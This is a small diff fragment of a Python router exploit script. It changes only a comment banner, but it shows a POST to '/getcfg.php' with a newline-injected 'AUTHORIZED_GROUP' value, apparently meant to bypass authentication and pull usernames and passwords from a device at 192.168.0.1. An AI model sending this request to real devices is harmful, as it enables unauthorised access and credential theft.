@@ -19,7 +19,7 @@ import re
 
 url = 'http://192.168.0.1/'
 print("Exploit start...")
-#########################get user and pass###########################
+#########################get user and pass##########################
 try:
     res = requests.post(urljoin(url,'/getcfg.php'),data={"SERVICES":"RUNTIME.WPS.WLAN-1","AUTHORIZED_GROUP":"1\n"})
     # print(res.content)
